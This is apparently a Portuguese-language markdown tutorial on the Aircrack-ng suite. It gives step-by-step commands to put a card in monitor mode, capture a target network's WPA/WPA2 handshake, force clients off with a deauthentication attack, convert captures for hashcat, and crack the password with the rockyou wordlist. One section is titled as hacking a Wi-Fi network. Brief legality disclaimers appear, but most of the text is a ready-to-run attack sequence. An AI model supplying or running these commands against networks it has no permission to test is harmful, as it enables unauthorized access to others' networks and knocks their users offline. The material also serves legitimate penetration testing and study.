# Aircrack-ng

O **Aircrack-ng** é um conjunto de ferramentas de segurança de rede projetadas para avaliar a segurança das redes sem fio. Ele é amplamente utilizado para realizar testes de penetração em redes Wi-Fi, especialmente aquelas que usam criptografia WEP, WPA e WPA2. A suíte Aircrack-ng permite capturar pacotes de dados, descriptografar senhas e realizar ataques de força bruta em redes sem fio.

### Componentes Principais do Aircrack-ng

1. **airmon-ng**: Coloca interfaces de rede sem fio em modo monitor, permitindo a captura de pacotes em todas as redes ao alcance.

2. **airodump-ng**: Captura pacotes de dados em redes Wi-Fi e coleta informações sobre os pontos de acesso e dispositivos conectados.

3. **aireplay-ng**: Realiza ataques de replay, deauth, fake authentication e outros tipos de injeção de pacotes para obter mais tráfego de dados.

4. **aircrack-ng**: Analisa os pacotes capturados e tenta quebrar as senhas WEP e WPA/WPA2 usando ataques de dicionário, força bruta e outras técnicas.

5. **airdecap-ng**: Descriptografa pacotes WEP/WPA/WPA2 após obter a chave de criptografia.

## 💻️ | O que é o `airmon-ng`?

- **`airmon-ng`**: É uma ferramenta que ativa o modo monitor em adaptadores de rede sem fio compatíveis. O modo monitor permite que a interface de rede capture todos os pacotes no ar, não apenas aqueles destinados ao seu endereço MAC.

### Descobrir o nome da rede

```bash
iwconfig
```

```bash
iwlist scan
```

ou

```bash
sudo airmon-ng
```

## 💻️ | Funções do `airmon-ng`

1. **Iniciar Modo Monitor:**
- Coloca uma interface sem fio no modo monitor.
- Comando:
```bash
sudo airmon-ng start wlan0
```
- Isso criará uma nova interface no modo monitor, geralmente chamada `wlan0mon` ou algo semelhante.

2. **Parar Modo Monitor:**
- Retorna a interface sem fio ao modo gerenciador padrão.
- Comando:
```bash
sudo airmon-ng stop wlan0mon
```

3. **Verificar Processos:**
- Lista processos que podem interferir na captura de pacotes.
- Comando:

```bash
sudo airmon-ng check
```

- Para matar esses processos, você pode usar:
```bash
sudo airmon-ng check kill
```

### Considerações de Segurança e Legalidade

- **Segurança:** Use essas ferramentas apenas em redes que você possui ou tem permissão explícita para testar.
- **Legalidade:** Esteja ciente das leis locais sobre testes de segurança e hacking de redes sem fio.

Se precisar de mais informações ou ajuda com comandos específicos, sinta-se à vontade para perguntar!

O `airodump-ng` é uma ferramenta avançada da suíte `aircrack-ng`, amplamente utilizada em auditoria de segurança de redes sem fio. Como parte integral do conjunto de ferramentas, `airodump-ng` é especificamente projetado para capturar pacotes de dados e fornecer informações detalhadas sobre redes Wi-Fi próximas, incluindo redes criptografadas e não criptografadas.

----

## 💻️ | Funcionalidades do `airodump-ng`

1. **Captura de Pacotes:**
   - `airodump-ng` captura pacotes de dados transmitidos entre dispositivos e pontos de acesso em redes sem fio, permitindo uma análise profunda do tráfego de rede.

2. **Monitoramento de Redes:**
- Ele pode monitorar múltiplas redes simultaneamente, exibindo detalhes como SSID (nome da rede), BSSID (MAC do ponto de acesso), canal, força do sinal, tipo de criptografia (WEP, WPA, WPA2), número de clientes conectados e muito mais.

3. **Coleta de IVs para Quebra de Chaves WEP:**
- Em redes WEP, `airodump-ng` coleta Vectores de Inicialização (IVs), essenciais para realizar a quebra de chaves usando ferramentas como `aircrack-ng`.

4. **Suporte a Múltiplas Interfaces:**
- Pode operar em várias interfaces de rede simultaneamente, sendo capaz de capturar pacotes de diferentes canais e bandas de frequência.

## 💻️ | Uso Avançado do `airodump-ng`

#### Comandos e Opções Principais

1. **Iniciar Captura Básica:**
```bash
sudo airodump-ng wlan0mon
```
- Aqui, `wlan0mon` é a interface no modo monitor, criada anteriormente com `airmon-ng`.

2. **Captura Focada em um Canal e BSSID Específico:**
```bash
sudo airodump-ng [interface] -c [canal] --bssid [BSSID] -w [prefixo_do_arquivo]
```
- `-c [canal]` especifica o canal da rede alvo.
- `--bssid [BSSID]` filtra apenas os pacotes do ponto de acesso com o BSSID fornecido.
- `-w [prefixo_do_arquivo]` define o prefixo para os arquivos de saída onde os dados capturados serão armazenados. Arquivo em formato `.hccapx` \ `.pcap`

3. **Captura de Pacotes WPA/WPA2 para Tentativa de Quebra de Chave:**

Esse tipo de ataque envia um pacote de desautenticação ao roteador que você quer hackear, fazendo com que a internet seja desconectada e pedindo que o usuário faça login novamente. Depois que o login é feito, o aperto de mão será realizado.

```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```
- Este comando captura pacotes do ponto de acesso com BSSID `00:11:22:33:44:55` no canal 6, salvando os dados com o prefixo `capture`.

Agora temos que esperar que um dispositivo se conecte à rede, mas existe uma maneira melhor de capturar um aperto
de mão. Podemos desautenticar os dispositivos para o AP usando um ataque de desautenticação usando o seguinte
comando:

```bash
sudo aireplay-ng -0 -a E4:6F:13:04:CE:31
```
- **-a**: Bssid da rede de destino
- **-0**: Ataque de desautenticação


4. **Exibir Redes em Canais Específicos:**
```bash
sudo airodump-ng --channel 1,6,11 wlan0mon
```
- Monitora os canais 1, 6 e 11, comuns em redes Wi-Fi.

### Análise e Exploração dos Dados Capturados

Após capturar os pacotes com `airodump-ng`, os dados podem ser usados para várias análises:

1. **Quebra de Chaves WEP:**
- Utilizando os IVs coletados, `aircrack-ng` pode tentar quebrar a chave WEP.

- Comando:
```bash
aircrack-ng -b 00:11:22:33:44:55 capture*.cap
```

2. **Cracking WPA/WPA2:**
- Para redes WPA/WPA2, é necessário capturar um handshake (aperto de mão).
- Posteriormente, `aircrack-ng` ou ferramentas como `hashcat` podem ser usadas para tentar quebrar a chave utilizando um ataque de dicionário ou força bruta.

### Considerações de Segurança e Legalidade

- **Segurança:** O uso de `airodump-ng` deve ser restrito a redes que você possui ou tem permissão explícita para testar. Qualquer outra forma de uso é ilegal e antiética.
- **Legalidade:** Estar ciente das leis locais e regulamentos sobre a interceptação e análise de tráfego de rede é crucial para evitar consequências legais.

`airodump-ng` é uma ferramenta poderosa para profissionais de segurança cibernética e entusiastas de redes sem fio, fornecendo capacidades avançadas de monitoramento e captura de pacotes que são fundamentais para auditorias de segurança eficazes.

----

## 💻️ | (.cap) para (.hccapx)

Para converter um arquivo `.cap` (capturado pelo `airodump-ng` ou outras ferramentas de captura de pacotes) para o formato `.hccapx` (usado pelo Hashcat para ataques de quebra de senha WPA/WPA2), você pode usar a ferramenta `cap2hccapx`. Aqui está um guia passo a passo sobre como fazer isso no Linux.

### Passo 1: Obter a Ferramenta `cap2hccapx`

1. **Clone o repositório do Hashcat utils:**
   ```bash
   git clone https://github.com/hashcat/hashcat-utils.git
   ```
2. **Compile a ferramenta `cap2hccapx`:**
   ```bash
   cd hashcat-utils/src
   make
   ```

Isso compilará várias ferramentas, incluindo `cap2hccapx`.

### Passo 2: Converter o Arquivo `.cap` para `.hccapx`

1. **Executar a conversão:**
   ```bash
   ./cap2hccapx.bin input.cap output.hccapx
   ```
   - `input.cap`: é o seu arquivo de captura original.
   - `output.hccapx`: é o nome do arquivo de saída no formato `.hccapx`.

### Exemplo Completo

1. **Clonar e compilar:**
   ```bash
   git clone https://github.com/hashcat/hashcat-utils.git
   cd hashcat-utils/src
   make
   ```

2. **Converter o arquivo:**
   ```bash
   ./cap2hccapx.bin input.cap output.hccapx
   ```

### Alternativa com a Ferramenta `hcxtools`

Outra opção é usar a ferramenta `hcxtools`, que também pode converter arquivos `.cap` para `.hccapx`.

1. **Instalar `hcxtools`:**
   - Para Debian/Ubuntu:
     ```bash
     sudo apt-get install hcxtools
     ```
   - Para Fedora:
     ```bash
     sudo dnf install hcxtools
     ```
   - Para Arch Linux:
     ```bash
     sudo pacman -S hcxtools
     ```

2. **Converter o arquivo usando `hcxpcapngtool`:**
   ```bash
   hcxpcapngtool -o output.hccapx input.cap
   ```

### Verificação da Conversão

Depois de converter o arquivo, você pode usar o Hashcat para iniciar o ataque de força bruta ou dicionário:

```bash
hashcat -m 2500 output.hccapx wordlist.txt
```

### Conclusão

Aqui está um resumo dos comandos necessários:

1. **Para `cap2hccapx`:**
```bash
git clone https://github.com/hashcat/hashcat-utils.git

cd hashcat-utils/src

make

./cap2hccapx.bin input.cap output.hccapx
```

2. **Para `hcxtools`:**
```bash
sudo apt-get install hcxtools
hcxpcapngtool -o output.hccapx input.cap
```

Essas ferramentas permitem que você converta arquivos `.cap` para `.hccapx`, facilitando a utilização de Hashcat para quebra de chaves WPA/WPA2. Certifique-se de usar essas ferramentas de forma ética e legal, somente em redes que você possui ou tem permissão explícita para testar.

----

## 💻️ | Hackenado a rede Wi-Fi

### Instale o naive-hashcat

Esse é o serviço usado para descobrir a senha da rede.

Digite os seguintes comandos, em ordem: 
```bash
sudo git clone https://github.com/brannondorsey/naive-hashcat

cd naive-hashcat

sudo curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

### Verifique se o Hashcat está utilizando OpenCL:

```bash
sudo apt install hashcat

hashcat -I
```

### Execute o naive-hashcat

**user@userPC:~/naive-hashcat$**
```bash
sudo HASH_FILE=input.cap POT_FILE=output.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Quando isso ocorre, ela é adicionada no arquivo "name.pot" encontrado na pasta "naive-hashcat"; a palavra ou frase depois do último sinal de dois pontos é a senha.

- Pode ser preciso desde algumas horas até meses para que uma senha seja hackeada.

- Caso seu computador não tenha uma GPU (Graphics Processing Unit - Unidade de processamento visual), será preciso usar o [aircrack-ng](/#💻️ | Usando o Aircrack-Ng em computadores sem GPU) então. 

----

## 💻️ | Usando o Aircrack-Ng em computadores sem GPU

### Baixe um arquivo de dicionário

O mais usado dele é o "Rock You". Você pode baixá-lo por meio do comando abaixo: 

```bash
sudo curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

- Saiba que o aircrack-ng não é capaz de hackear a senha do WPA ou WPA2 caso ela não esteja na lista de palavras.

### Informe o aircrack-ng a iniciar a descoberta da senha

Para tanto, insira o comando abaixo, usando as informações de rede corretas: 

```bash
sudo aircrack-ng -a2 -b MAC -w rockyou.txt *.cap
```

- Se estiver hackeando uma rede WPA em vez de WPA2, substitua "-a2" por-a.
- Substitua `MAC` pelo endereço Mac obtido na última seção.
